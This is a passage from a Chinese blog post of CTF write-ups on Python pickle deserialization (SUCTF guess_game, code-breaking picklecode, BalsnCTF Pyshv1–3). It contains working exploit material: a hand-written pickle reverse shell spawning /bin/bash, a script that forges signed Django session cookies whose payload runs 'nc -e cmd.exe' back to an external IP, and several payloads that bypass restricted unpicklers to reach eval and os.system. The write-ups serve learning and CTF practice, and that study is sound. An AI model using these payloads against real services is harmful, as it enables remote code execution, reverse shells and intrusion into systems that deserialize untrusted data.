-<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><pre><code class="python">&#39;&#39;&#39;csocket\n__dict__\np101\n0c__builtin__\ngetattr\n(g101\nS&#39;__getitem__&#39;\ntRp102\n0g102\n(S&#39;AF_INET&#39;\ntRp100\n0csocket\n__dict__\np104\n0c__builtin__\ngetattr\n(g104\nS&#39;__getitem__&#39;\ntRp105\n0g105\n(S&#39;SOCK_STREAM&#39;\ntRp103\n0csocket\n__dict__\np107\n0c__builtin__\ngetattr\n(g107\nS&#39;__getitem__&#39;\ntRp108\n0g108\n(S&#39;IPPROTO_TCP&#39;\ntRp106\n0csocket\n__dict__\np110\n0c__builtin__\ngetattr\n(g110\nS&#39;__getitem__&#39;\ntRp111\n0g111\n(S&#39;SOL_SOCKET&#39;\ntRp109\n0csocket\n__dict__\np113\n0c__builtin__\ngetattr\n(g113\nS&#39;__getitem__&#39;\ntRp114\n0g114\n(S&#39;SO_REUSEADDR&#39;\ntRp112\n0csocket\nsocket\n(g100\ng103\ng106\ntRp115\n0c__builtin__\ngetattr\n(csocket\nsocket\nS&#39;setsockopt&#39;\ntRp116\n0c__builtin__\napply\n(g116\n(g115\ng109\ng112\nI1\nltRp117\n0c__builtin__\ngetattr\n(csocket\nsocket\nS&#39;connect&#39;\ntRp118\n0c__builtin__\napply\n(g118\n(g115\n(S&#39;localhost&#39;\nI55555\ntltRp119\n0c__builtin__\ngetattr\n(csocket\n_socketobject\nS&#39;fileno&#39;\ntRp120\n0c__builtin__\napply\n(g120\n(g115\nltRp121\n0c__builtin__\nint\n(g121\ntRp122\n0csubprocess\nPopen\n((S&#39;/bin/bash&#39;\ntI0\nS&#39;/bin/bash&#39;\ng122\ng122\ng122\ntRp123\n0S&#39;finished&#39;\n.&#39;&#39;&#39;</code></pre>
-<p>localhost:55555</p>
-<h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><ol>
-<li>使用v0版的pickle协议,保证shellcode的通用性</li>
-</ol>
-<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="suctf-guess-game"><a href="#suctf-guess-game" class="headerlink" title="suctf guess_game"></a>suctf guess_game</h3><p><a href="https://github.com/team-su/SUCTF-2019/tree/master/Misc/guess_game" target="_blank" rel="noopener">题目链接</a></p>
-<p>考点:pickle</p>
-<p>代码审计一波后</p>
-<p>如果猜对10次后会给flag(机会只有10次)</p>
-<p>因为知道是考pickle直接全局搜索pickle发现在server处有</p>
-<p><code>ticket = restricted_loads(ticket)</code></p>
-<p>其中ticket是我们可控点</p>
-<p>跟进去看</p>
-<pre><code class="python">class RestrictedUnpickler(pickle.Unpickler):
-    def find_class(self, module, name):
-        # Only allow safe classes
-        if &quot;guess_game&quot; == module[0:10] and &quot;__&quot; not in name:
-            return getattr(sys.modules[module], name)
-        # Forbid everything else.
-        raise pickle.UnpicklingError(&quot;global &#39;%s.%s&#39; is forbidden&quot; % (module, name))
-
-
-def restricted_loads(s):
-    &quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;
-    return RestrictedUnpickler(io.BytesIO(s)).load()</code></pre>
-<p>我们只能加载guess_game中的类,并且不能调用魔术方法.</p>
-<p>在这一题中拿到flag有两种方式:</p>
-<ol>
-<li>命令执行</li>
-<li>通过游戏</li>
-</ol>
-<p>在怼着find_class许久之后发现没办法绕过,于是只能走通过游戏这一条路了</p>
-<p>而游戏中判定赢的条件是</p>
-<pre><code class="python">class Game
-    def is_win(self):
-        return self.win_count == max_round</code></pre>
-<p>如果我们能直接修改win_count或者max_round就可以拿到flag了</p>
-<p>我们发现在<code>guess_game</code>中已经有一个<code>game = Game()</code>这个了,也就是我们可以利用pickle来加载这个game直接修改</p>
-<p>那么接下来就是如何修改了</p>
-<p>在pickle的操作码中我们发现</p>
-<p><code>BUILD          = b&#39;b&#39;   # call __setstate__ or __dict__.update()</code>这一条</p>
-<p>其中update()就可以修改game的属性了</p>
-<p>那么接下来就只有一个问题了,操作码<code>b</code>如何使用</p>
-<p>一路跟踪发现b操作码的实现</p>
-<pre><code class="python">    def load_build(self):
-        stack = self.stack
-        state = stack.pop()
-        inst = stack[-1]
-        setstate = getattr(inst, &quot;__setstate__&quot;, None)
-        if setstate is not None:
-            setstate(state)
-            return
-        slotstate = None
-        if isinstance(state, tuple) and len(state) == 2:
-            state, slotstate = state
-        if state:
-            inst_dict = inst.__dict__
-            intern = sys.intern
-            for k, v in state.items():
-                if type(k) is str:
-                    inst_dict[intern(k)] = v
-                else:
-                    inst_dict[k] = v
-        if slotstate:
-            for k, v in slotstate.items():
-                setattr(inst, k, v)</code></pre>
-<p>没有调用参数,栈顶应为字典,栈顶的下面是要修改的对象</p>
-<p>最后的payload:</p>
-<pre><code class="python">b&quot;cguess_game\ngame\n(S&#39;win_count&#39;\nI10\nS&#39;round_count&#39;\nI10\ndb\x80\x03cguess_game.Ticket\nTicket\nq\x00)\x81q\x01}q\x02X\x06\x00\x00\x00numberq\x03K\x01sb.&quot;</code></pre>
-<h3 id="code-breaking-picklecode"><a href="#code-breaking-picklecode" class="headerlink" title="code breaking picklecode"></a>code breaking picklecode</h3><p><a href="https://github.com/phith0n/code-breaking/blob/master/2018/picklecode" target="_blank" rel="noopener">题目链接</a></p>
-<p>代码审计发现在index处可以ssti</p>
-<pre><code class="python">def index(request):
-    django_engine = engines[&#39;django&#39;]
-    template = django_engine.from_string(&#39;My name is &#39; + request.user.username)
-
-    return HttpResponse(template.render(None, request))</code></pre>
-<p>但是django难以利用ssti命令执行但是能读取敏感配置</p>
-<p>结合serializer.py</p>
-<pre><code class="python">class RestrictedUnpickler(pickle.Unpickler):
-    blacklist = {&#39;eval&#39;, &#39;exec&#39;, &#39;execfile&#39;, &#39;compile&#39;, &#39;open&#39;, &#39;input&#39;, &#39;__import__&#39;, &#39;exit&#39;}
-
-    def find_class(self, module, name):
-        # Only allow safe classes from builtins.
-        if module == &quot;builtins&quot; and name not in self.blacklist:
-            return getattr(builtins, name)
-        # Forbid everything else.
-        raise pickle.UnpicklingError(&quot;global &#39;%s.%s&#39; is forbidden&quot; %
-                                     (module, name))
-
-
-class PickleSerializer():
-    def dumps(self, obj):
-        return pickle.dumps(obj)
-
-    def loads(self, data):
-        try:
-            if isinstance(data, str):
-                raise TypeError(&quot;Can&#39;t load pickle from unicode string&quot;)
-            file = io.BytesIO(data)
-            return RestrictedUnpickler(file,
-                              encoding=&#39;ASCII&#39;, errors=&#39;strict&#39;).load()
-        except Exception as e:
-            return {}</code></pre>
-<p>和setting文件里的特殊配置</p>
-<pre><code class="python">SESSION_ENGINE = &#39;django.contrib.sessions.backends.signed_cookies&#39;
-SESSION_SERIALIZER = &#39;core.serializer.PickleSerializer&#39;</code></pre>
-<p>查阅django文档发现</p>
-<p> <a href="https://docs.djangoproject.com/zh-hans/3.0/topics/http/sessions/#using-cookie-based-sessions" target="_blank" rel="noopener">https://docs.djangoproject.com/zh-hans/3.0/topics/http/sessions/#using-cookie-based-sessions</a> </p>
-<p>可以确定,这里是通过读取secret_key来构造恶意cookie来pickle反序列化命令执行</p>
-<p>我们跟进django.contrib.sessions.backends.signed_cookies来了解如何生成储存session的cookie(这里花了我很久的时间,从尝试看一步一步调试到看调用堆栈再到查文档最后才搞清楚过程,建议自己尝试)</p>
-<p>在理解之后便有一下生成恶意cookie的代码</p>
-<pre><code class="python">import base64
-import datetime
-import json
-import re
-import time
-import zlib
-import pickle
-from django.utils import baseconv
-from django.utils.crypto import constant_time_compare, salted_hmac
-from django.utils.encoding import force_bytes
-from django.utils.module_loading import import_string
-from django import core
-from django.core import signing
-
-
-myexp=b&#39;&#39;&#39;cbuiltins
-globals
-(tRp100
-cbuiltins
-getattr
-p101
-(g100
-S&#39;get&#39;
-tR(S&#39;builtins&#39;
-tRp103
-g101
-(g103
-S&#39;eval&#39;
-tR(S&#39;eval(\&#39;\&#39;\&#39;__import__(&#39;os&#39;).system(&#39;nc -e &quot;cmd.exe /K&quot; 39.108.164.219 60000 -d&#39;)\&#39;\&#39;\&#39;)&#39;
-tR.&#39;&#39;&#39;
-def pickle_exp(SECRET_KEY):
-    data = myexp
-    compress=True
-    # Flag for if it&#39;s been compressed or not
-    is_compressed = False
-    salt=&#39;django.contrib.sessions.backends.signed_cookies&#39;
-    if compress:
-        # Avoid zlib dependency unless compress is being used
-        compressed = zlib.compress(data)
-        if len(compressed) &lt; (len(data) - 1):
-            data = compressed
-            is_compressed = True
-    base64d = signing.b64_encode(data).decode()
-    if is_compressed:
-        base64d = &#39;.&#39; + base64d
-    print(signing.TimestampSigner(key=SECRET_KEY, salt=salt).sign(base64d))
-
-
-pickle_exp(&quot;asdasdasdasdas&quot;)
-</code></pre>
-<p>接下来就是如何构造恶意的pickle代码的问题了</p>
-<p>题目限制了只能加载builtins里的属性</p>
-<p>且属性名不能为以下内容</p>
-<pre><code>blacklist = {&#39;eval&#39;, &#39;exec&#39;, &#39;execfile&#39;, &#39;compile&#39;, &#39;open&#39;, &#39;input&#39;, &#39;__import__&#39;, &#39;exit&#39;}</code></pre><p>利用<code>__reduce__</code>来生成pickle代码已经无法满足要求了,我们不得不手写pickle代码,怎么手写就不详细讲了</p>
-<p>我们现在把目光聚焦在如何构造利用链上</p>
-<p>builtins的属性(删除部分)</p>
-<pre><code class="python">[&#39;_&#39;, &#39;__build_class__&#39;, &#39;__debug__&#39;, &#39;__doc__&#39;, &#39;__import__&#39;, &#39;__loader__&#39;, &#39;__name__&#39;, &#39;__package__&#39;, &#39;__spec__&#39;, &#39;abs&#39;, &#39;all&#39;, &#39;any&#39;, &#39;ascii&#39;, &#39;bin&#39;, &#39;bool&#39;, &#39;breakpoint&#39;, &#39;bytearray&#39;, &#39;bytes&#39;, &#39;callable&#39;, &#39;chr&#39;, &#39;classmethod&#39;, &#39;compile&#39;, &#39;complex&#39;, &#39;copyright&#39;, &#39;credits&#39;, &#39;delattr&#39;, &#39;dict&#39;, &#39;dir&#39;, &#39;divmod&#39;, &#39;enumerate&#39;, &#39;eval&#39;, &#39;exec&#39;, &#39;exit&#39;, &#39;filter&#39;, &#39;float&#39;, &#39;format&#39;, &#39;frozenset&#39;, &#39;getattr&#39;, &#39;globals&#39;, &#39;hasattr&#39;, &#39;hash&#39;, &#39;help&#39;, &#39;hex&#39;, &#39;id&#39;, &#39;input&#39;, &#39;int&#39;, &#39;isinstance&#39;, &#39;issubclass&#39;, &#39;iter&#39;, &#39;len&#39;, &#39;license&#39;, &#39;list&#39;, &#39;locals&#39;, &#39;map&#39;, &#39;max&#39;, &#39;memoryview&#39;, &#39;min&#39;, &#39;next&#39;, &#39;object&#39;, &#39;oct&#39;, &#39;open&#39;, &#39;ord&#39;, &#39;pow&#39;, &#39;print&#39;, &#39;property&#39;, &#39;quit&#39;, &#39;range&#39;, &#39;repr&#39;, &#39;reversed&#39;, &#39;round&#39;, &#39;set&#39;, &#39;setattr&#39;, &#39;slice&#39;, &#39;sorted&#39;, &#39;staticmethod&#39;, &#39;str&#39;, &#39;sum&#39;, &#39;super&#39;, &#39;tuple&#39;, &#39;type&#39;, &#39;vars&#39;, &#39;zip&#39;]</code></pre>
-<p>我们查看builtins的属性我们发现两个有意思的东西,一个是getattr,另一个是globals</p>
-<p>虽然限制我们属性名不能为eval啥的,但是并没有限制不能出现在参数处</p>
-<p>所以<code>getattr(builtins,&quot;eval&quot;)</code>便能得到eval方法了</p>
-<p>但是看pickle的操作码并没有发现能直接导入一个模块的操作,在结合globals我们很容易想到<code>getattr(getattr(globals(),&quot;builtins&quot;),&quot;eval&quot;)</code></p>
-<p>最后的payload:<code>builtins.getattr(builtins.getattr(builtins.globals(),&quot;builtins&quot;),&quot;eval&quot;)(&quot;evil code&quot;)</code></p>
-<p>其对应的pickle代码是</p>
-<pre><code class="python">b&#39;&#39;&#39;cbuiltins
-globals
-(tRp100
-cbuiltins
-getattr
-p101
-(g100
-S&#39;get&#39;
-tR(S&#39;builtins&#39;
-tRp103
-g101
-(g103
-S&#39;eval&#39;
-tR(S&#39;eval(\&#39;\&#39;\&#39;__import__(&#39;os&#39;).system(&#39;nc -e &quot;cmd.exe /K&quot; 39.108.164.219 60000 -d&#39;)\&#39;\&#39;\&#39;)&#39;
-tR.&#39;&#39;&#39;</code></pre>
-<p>最后就差secret_key了,看别人的wp都是调试易得易得secret_key//</p>
-<p>但是我是没找到,于是自己写了个过滤器</p>
-<p>递归查找settings</p>
-<pre><code class="python">from django.http.response import HttpResponse, HttpResponseRedirect
-from django.template import engines
-from django.contrib.auth import login as auth_login, get_user_model, authenticate
-from django.contrib.auth.views import LoginView, logout_then_login
-from django.contrib.auth.decorators import login_required
-from django.views import generic
-from django import template
-
-import django
-from django import template
-register = template.Library()
-
-@register.filter
-def get_dict(obj,way=&quot;&quot;,depth=0):
-    if depth&gt;11:
-        return 
-    objdir=dir(obj)
-    r={&quot;dict&quot;:objdir,&quot;way&quot;:way}
-    result=&quot;&quot;
-
-    for i in objdir:            
-        try :
-            if &#39;_&#39; == i[0]:
-                continue
-            if getattr(obj, &#39;__module__&#39;, None)!=None and getattr(obj, &#39;__module__&#39;, None).split(&#39;.&#39;)[0] == django.__name__:
-                result+=get_dict(getattr(obj,i,None),way+&quot;.&quot;+i,depth+1) 
-        except TypeError:
-            pass
-
-    if &quot;SECRET_KEY&quot; in objdir or &quot;settings&quot; in objdir:
-        print(way)
-        return result+way+&quot;\n&quot;
-    return result</code></pre>
-<p>这次是真的易得了:),至此结束</p>
-<h3 id="BalsnCTF-2019-Pyshv1"><a href="#BalsnCTF-2019-Pyshv1" class="headerlink" title="BalsnCTF 2019 Pyshv1"></a>BalsnCTF 2019 Pyshv1</h3><pre><code class="python">#!/usr/bin/python3 -u
-
-import securePickle as pickle
-import codecs
-
-
-pickle.whitelist.append(&#39;sys&#39;)
-
-
-class Pysh(object):
-    def __init__(self):
-        self.login()
-        self.cmds = {}
-
-    def login(self):
-        user = input().encode(&#39;ascii&#39;)
-        user = codecs.decode(user, &#39;base64&#39;)
-        user = pickle.loads(user)
-        raise NotImplementedError(&quot;Not Implemented QAQ&quot;)
-
-    def run(self):
-        while True:
-            req = input(&#39;$ &#39;)
-            func = self.cmds.get(req, None)
-            if func is None:
-                print(&#39;pysh: &#39; + req + &#39;: command not found&#39;)
-            else:
-                func()
-
-
-if __name__ == &#39;__main__&#39;:
-    pysh = Pysh()
-    pysh.run()</code></pre>
-<pre><code class="python">import pickle
-import io
-
-
-whitelist = []
-
-
-# See https://docs.python.org/3.7/library/pickle.html#restricting-globals
-class RestrictedUnpickler(pickle.Unpickler):
-
-    def find_class(self, module, name):
-        if module not in whitelist or &#39;.&#39; in name:
-            raise KeyError(&#39;The pickle is spoilt :(&#39;)
-        return pickle.Unpickler.find_class(self, module, name)
-
-
-def loads(s):
-    &quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;
-    return RestrictedUnpickler(io.BytesIO(s)).load()
-
-
-dumps = pickle.dumps</code></pre>
-<p>只允许sys里的属性,而且属性里不能有.</p>
-<pre><code>[&#39;__displayhook__&#39;, &#39;__doc__&#39;, &#39;__excepthook__&#39;, &#39;__interactivehook__&#39;, &#39;__loader__&#39;, &#39;__name__&#39;, &#39;__package__&#39;, &#39;__spec__&#39;, &#39;__stderr__&#39;, &#39;__stdin__&#39;, &#39;__stdout__&#39;, &#39;_clear_type_cache&#39;, &#39;_current_frames&#39;, &#39;_debugmallocstats&#39;, &#39;_getframe&#39;, &#39;_git&#39;, &#39;_home&#39;, &#39;_xoptions&#39;, &#39;abiflags&#39;, &#39;api_version&#39;, &#39;argv&#39;, &#39;base_exec_prefix&#39;, &#39;base_prefix&#39;, &#39;builtin_module_names&#39;, &#39;byteorder&#39;, &#39;call_tracing&#39;, &#39;callstats&#39;, &#39;copyright&#39;, &#39;displayhook&#39;, &#39;dont_write_bytecode&#39;, &#39;exc_info&#39;, &#39;excepthook&#39;, &#39;exec_prefix&#39;, &#39;executable&#39;, &#39;exit&#39;, &#39;flags&#39;, &#39;float_info&#39;, &#39;float_repr_style&#39;, &#39;get_asyncgen_hooks&#39;, &#39;get_coroutine_wrapper&#39;, &#39;getallocatedblocks&#39;, &#39;getcheckinterval&#39;, &#39;getdefaultencoding&#39;, &#39;getdlopenflags&#39;, &#39;getfilesystemencodeerrors&#39;, &#39;getfilesystemencoding&#39;, &#39;getprofile&#39;, &#39;getrecursionlimit&#39;, &#39;getrefcount&#39;, &#39;getsizeof&#39;, &#39;getswitchinterval&#39;, &#39;gettrace&#39;, &#39;hash_info&#39;, &#39;hexversion&#39;, &#39;implementation&#39;, &#39;int_info&#39;, &#39;intern&#39;, &#39;is_finalizing&#39;, &#39;last_traceback&#39;, &#39;last_type&#39;, &#39;last_value&#39;, &#39;maxsize&#39;, &#39;maxunicode&#39;, &#39;meta_path&#39;, &#39;modules&#39;, &#39;path&#39;, &#39;path_hooks&#39;, &#39;path_importer_cache&#39;, &#39;platform&#39;, &#39;prefix&#39;, &#39;ps1&#39;, &#39;ps2&#39;, &#39;set_asyncgen_hooks&#39;, &#39;set_coroutine_wrapper&#39;, &#39;setcheckinterval&#39;, &#39;setdlopenflags&#39;, &#39;setprofile&#39;, &#39;setrecursionlimit&#39;, &#39;setswitchinterval&#39;, &#39;settrace&#39;, &#39;stderr&#39;, &#39;stdin&#39;, &#39;stdout&#39;, &#39;thread_info&#39;, &#39;version&#39;, &#39;version_info&#39;, &#39;warnoptions&#39;]
-</code></pre><p>发现有个modules,但是loads那里有一个死亡raise</p>
-<p><code>sys._getframe</code> 可以返回带有exec的字典,但是好像没啥用</p>
-<p>现在问题是不知道如何取出modules里的值</p>
-<p>阅读文档发现</p>
-<blockquote>
-<p>This is a dictionary that maps module names to modules which have already been loaded. This can be manipulated to force reloading of modules and other tricks. However, replacing the dictionary will not necessarily work as expected and deleting essential items from the dictionary may cause Python to fail. </p>
-</blockquote>
-<p>可以修改modules来修改模块内容</p>
-<pre><code class="shell">&gt;&gt;&gt; import sys
-&gt;&gt;&gt; sys.modules[&#39;sys&#39;]=sys.modules
-&gt;&gt;&gt; import sys
-&gt;&gt;&gt; dir(sys)
-[&#39;__class__&#39;, &#39;__contains__&#39;, &#39;__delattr__&#39;, &#39;__delitem__&#39;, &#39;__dir__&#39;, &#39;__doc__&#39;, &#39;__eq__&#39;, &#39;__format__&#39;, &#39;__ge__&#39;, &#39;__getattribute__&#39;, &#39;__getitem__&#39;, &#39;__gt__&#39;, &#39;__hash__&#39;, &#39;__init__&#39;, &#39;__init_subclass__&#39;, &#39;__iter__&#39;, &#39;__le__&#39;, &#39;__len__&#39;, &#39;__lt__&#39;, &#39;__ne__&#39;, &#39;__new__&#39;, &#39;__reduce__&#39;, &#39;__reduce_ex__&#39;, &#39;__repr__&#39;, &#39;__setattr__&#39;, &#39;__setitem__&#39;, &#39;__sizeof__&#39;, &#39;__str__&#39;, &#39;__subclasshook__&#39;, &#39;clear&#39;, &#39;copy&#39;, &#39;fromkeys&#39;, &#39;get&#39;, &#39;items&#39;, &#39;keys&#39;, &#39;pop&#39;, &#39;popitem&#39;, &#39;setdefault&#39;, &#39;update&#39;, &#39;values&#39;]</code></pre>
-<p>然后sys就被替换成sys.modules了,就可以拿到os了</p>
-<p>然后再对sys.modules[‘sys’]再赋值为os</p>
-<p>就可以import os了</p>
-<p>(师傅们tql)</p>
-<p>构造payload</p>
-<pre><code>csys
-modules
-S&#39;sys&#39;
-csys
-modules
-p100
-scsys
-get
-(S&#39;os&#39;
-tRp101
-g100
-S&#39;sys&#39;
-g101
-scsys
-system
-(S&#39;dir&#39;
-tR.</code></pre><h3 id="BalsnCTF-2019-Pyshv2"><a href="#BalsnCTF-2019-Pyshv2" class="headerlink" title="BalsnCTF 2019 Pyshv2"></a>BalsnCTF 2019 Pyshv2</h3><pre><code class="python">#!/usr/bin/python3 -u
-
-import securePickle as pickle
-import codecs
-
-
-pickle.whitelist.append(&#39;structs&#39;)
-
-
-class Pysh(object):
-    def __init__(self):
-        self.login()
-        self.cmds = {
-            &#39;help&#39;: self.cmd_help,
-            &#39;flag&#39;: self.cmd_flag,
-        }
-
-    def login(self):
-        user = input().encode(&#39;ascii&#39;)
-        user = codecs.decode(user, &#39;base64&#39;)
-        user = pickle.loads(user)
-        raise NotImplementedError(&quot;Not Implemented QAQ&quot;)
-
-    def run(self):
-        while True:
-            req = input(&#39;$ &#39;)
-            func = self.cmds.get(req, None)
-            if func is None:
-                print(&#39;pysh: &#39; + req + &#39;: command not found&#39;)
-            else:
-                func()
-
-    def cmd_help(self):
-        print(&#39;Available commands: &#39; + &#39; &#39;.join(self.cmds.keys()))
-
-    def cmd_su(self):
-        print(&quot;Not Implemented QAQ&quot;)
-        # self.user.privileged = 1
-
-    def cmd_flag(self):
-        print(&quot;Not Implemented QAQ&quot;)
-
-
-if __name__ == &#39;__main__&#39;:
-    pysh = Pysh()
-    pysh.run()</code></pre>
-<p>这次更骚了直接给了个空模块</p>
-<pre><code class="shell">&gt;&gt;&gt; dir(structs)
-[&#39;__builtins__&#39;, &#39;__cached__&#39;, &#39;__doc__&#39;, &#39;__file__&#39;, &#39;__loader__&#39;, &#39;__name__&#39;, &#39;__package__&#39;, &#39;__spec__&#39;]</code></pre>
-<p><code>__spec__,__loader__,__builtins__</code>是我们需要注意的</p>
-<p>我们看一下操作码c(看重载后的find_class代码,看别人wp的时候没看重载后的find_class,然后连wp都看不懂了)的实现,发现调用了<code>__import__</code></p>
-<p>在文档中发现</p>
-<blockquote>
-<p>此函数(<code>__import__</code>)会由 <a href="https://docs.python.org/zh-cn/3/reference/simple_stmts.html#import" target="_blank" rel="noopener"><code>import</code></a> 语句发起调用。 它可以被替换 (通过导入 <a href="https://docs.python.org/zh-cn/3/library/builtins.html#module-builtins" target="_blank" rel="noopener"><code>builtins</code></a> 模块并赋值给 <code>builtins.__import__</code>) 以便修改 <code>import</code> 语句的语义 </p>
-</blockquote>
-<p>而<code>__buiutins__</code>里面也有<code>__import__</code></p>
-<pre><code>&gt;&gt;&gt; structs.__builtins__[&#39;__import__&#39;]=eval
-&gt;&gt;&gt; import os
-Traceback (most recent call last):
-  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;
-TypeError: eval expected at most 3 arguments, got 5
-&gt;&gt;&gt; __import__(&#39;print(123)&#39;)
-123</code></pre><p>成功修改了<code>__import__</code></p>
-<p>我们再看重载的find_class</p>
-<p>securePickle.py</p>
-<pre><code class="python">class RestrictedUnpickler(pickle.Unpickler):
-
-    def find_class(self, module, name):
-        if module not in whitelist or &#39;.&#39; in name:
-            raise KeyError(&#39;The pickle is spoilt :(&#39;)
-        module = __import__(module)
-        return getattr(module, name)
-#一般重载都会改成if xxxx : raise xxxx else:  return pickle.Unpickler.find_class(self, module, name)
-</code></pre>
-<p>而原来的find_class是这样的</p>
-<pre><code class="python">def find_class:
-    __import__(module, level=0)
-    return getattr(sys.modules[module], name)</code></pre>
-<p>接着我们可以通过操作码c来实现一下操作</p>
-<pre><code class="python">return getattr(__import__(module), name)</code></pre>
-<p>如果能令<code>__import__(module)</code>的返回值为<code>__builtins__</code>时,就可以取出<code>__builtins__</code>里的值</p>
-<p>结合<a href="https://pyzh.readthedocs.io/en/latest/python-magic-methods-guide.html#id1" target="_blank" rel="noopener">魔术方法</a><code>__getattribute__</code>便可以实现</p>
-<p>于是构造</p>
-<pre><code class="python">bis=structs.__builtins__
-structs.__setattr__(&#39;structs&#39;,bis)#name只能为structs
-bis[&#39;__import__&#39;]=structs.__getattribute__
-getattr(__import__(&quot;structs&quot;),&quot;get&quot;)(&quot;eval&quot;)(&quot;print(123)&quot;)</code></pre>
-<p>对应的pickle代码</p>
-<pre><code>cstructs
-__builtins__
-p100
-0cstructs
-__setattr__
-(S&#39;structs&#39;
-g100
-tRg100
-S&#39;__import__&#39;
-cstructs
-__getattribute__
-scstructs
-get
-(S&quot;eval&quot;
-tR(S&#39;print(123)&#39;
-tR.</code></pre><h3 id="BalsnCTF-2019-Pyshv3"><a href="#BalsnCTF-2019-Pyshv3" class="headerlink" title="BalsnCTF 2019 Pyshv3"></a>BalsnCTF 2019 Pyshv3</h3><p>structs.py</p>
-<pre><code class="python">class User(object):
-    def __init__(self, name, group):
-        self.name = name
-        self.group = group
-        self.isadmin = 0
-        self.prompt = &#39;&#39;</code></pre>
-<pre><code class="python">import pickle
-import io
-
-
-whitelist = []
-
-
-# See https://docs.python.org/3.7/library/pickle.html#restricting-globals
-class RestrictedUnpickler(pickle.Unpickler):
-
-    def find_class(self, module, name):
-        if module not in whitelist or &#39;.&#39; in name:
-            raise KeyError(&#39;The pickle is spoilt :(&#39;)
-        return pickle.Unpickler.find_class(self, module, name)
-
-
-def loads(s):
-    &quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;
-    return RestrictedUnpickler(io.BytesIO(s)).load()
-
-
-dumps = pickle.dumps</code></pre>
-<p>server.py</p>
-<pre><code class="python">import securePickle as pickle
-import codecs
-import os
-
-
-pickle.whitelist.append(&#39;structs&#39;)
-
-
-class Pysh(object):
-    def __init__(self):
-        self.key = os.urandom(100)
-        self.login()
-        self.cmds = {
-            &#39;help&#39;: self.cmd_help,
-            &#39;whoami&#39;: self.cmd_whoami,
-            &#39;su&#39;: self.cmd_su,
-            &#39;flag&#39;: self.cmd_flag,
-        }
-
-    def login(self):
-        with open(&#39;../flag.txt&#39;, &#39;rb&#39;) as f:
-            flag = f.read()
-        flag = bytes(a ^ b for a, b in zip(self.key, flag))
-        user = input().encode(&#39;ascii&#39;)
-        user = codecs.decode(user, &#39;base64&#39;)
-        user = pickle.loads(user)
-        print(&#39;Login as &#39; + user.name + &#39; - &#39; + user.group)
-        user.privileged = False
-        user.flag = flag
-        self.user = user
-
-    def run(self):
-        while True:
-            req = input(&#39;$ &#39;)
-            func = self.cmds.get(req, None)
-            if func is None:
-                print(&#39;pysh: &#39; + req + &#39;: command not found&#39;)
-            else:
-                func()
-
-    def cmd_help(self):
-        print(&#39;Available commands: &#39; + &#39; &#39;.join(self.cmds.keys()))
-
-    def cmd_whoami(self):
-        print(self.user.name, self.user.group)
-
-    def cmd_su(self):
-        print(&quot;Not Implemented QAQ&quot;)
-        # self.user.privileged = 1
-
-    def cmd_flag(self):
-        if not self.user.privileged:
-            print(&#39;flag: Permission denied&#39;)
-        else:
-            print(bytes(a ^ b for a, b in zip(self.user.flag, self.key)))
-
-
-if __name__ == &#39;__main__&#39;:
-    pysh = Pysh()
-    pysh.run()</code></pre>
-<p>如果我们想拿到flag,要么命令执行直接拿flag要么就令<code>user.privileged=True</code> 调用cmd_flag来拿flag</p>
-<p>但是再反序列化处</p>
-<pre><code class="python">        user = pickle.loads(user)
-        print(&#39;Login as &#39; + user.name + &#39; - &#39; + user.group)
-        user.privileged = False</code></pre>
-<p><code>user.privileged</code>会被覆盖为False,再康康其他的信息把</p>
-<p><code>dir(structs)</code>:</p>
-<pre><code class="python">[&#39;User&#39;, &#39;__builtins__&#39;, &#39;__cached__&#39;, &#39;__doc__&#39;, &#39;__file__&#39;, &#39;__loader__&#39;, &#39;__name__&#39;, &#39;__package__&#39;, &#39;__spec__&#39;]</code></pre>
-<hr>
-<p>几个小时后,看wp学成归来.</p>
-<p>我:艹,太骚了,师傅们牛逼死了</p>
-<hr>
-<p>之前说有两个解题思路,命令执行这一个思路在看了一会之后就觉得不太行,毫无头绪</p>
-<p>再康康让<code>user.privileged=False</code>失效这一思路,emmmm感觉也不太行.</p>
-<p>但是,类的赋值肯定会受到一些特殊函数的影响</p>
-<p>在研究类的赋值的时候可以找到<a href="https://foofish.net/what-is-descriptor-in-python.html" target="_blank" rel="noopener">描述符</a>可以自定义赋值函数</p>
-<p>那么如果我们能让User的<code>__set__</code>变成一个接受3个参数的函数,就可以令<code>user.privileged=False</code>无效</p>
-<p>但是很显然pickle里是无法直接编写代码的,令<code>__set__=&quot;&quot;</code>?更不行,会直接报错</p>
-<p>继续阅读代码我们会发现一个神奇的东西</p>
-<pre><code class="python">class User(object):
-    def __init__(self, name, group):
-        self.name = name
-        self.group = group
-        self.isadmin = 0
-        self.prompt = &#39;&#39;
-        print(&quot;name:%s ,group:%s&quot;%(name,group))</code></pre>
-<p><code>User.__init__</code>刚好接受三个参数</p>
-<p>我们能不能让<code>__set__=User</code>?,然后调用<code>__set__</code>的时候调用<code>User.__init__</code></p>
-<pre><code class="python">&gt;&gt;&gt; setattr(User,&#39;test&#39;,User(123,123))
-name:123 ,group:123
-&gt;&gt;&gt; setattr(User,&quot;__set__&quot;,User)
-&gt;&gt;&gt; b=User(123,123)
-name:123 ,group:123
-&gt;&gt;&gt; b.test=123123
-name:&lt;structs.User object at 0x0000017BA1538748&gt; ,group:123123</code></pre>
-<p>于是构造:</p>
-<pre><code class="python">a=__import__(&quot;structs&quot;).User
-b=User(&quot;123&quot;,&quot;456&quot;)
-setattr(a,&quot;privileged&quot;,b)
-setattr(a,&quot;__set__&quot;,a)
-return b</code></pre>
-<p>对应的pickle代码为</p>
-<pre><code>cstructs
-User
-p100
-(S&quot;123&quot;
-S&quot;456&quot;
-tRp101
-g100
-(N}S&#39;privileged&#39;
-g101
-sS&#39;__set__&#39;
-g100
-stbg101
-.</code></pre><pre><code>$ help
-Available commands: help whoami su flag
-$ whoami
-123 456
-$ flag
-b&#39;Balsn{pY7h0n1dae_ObJ3c7}\n&#39;</code></pre><p>hhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh</p>
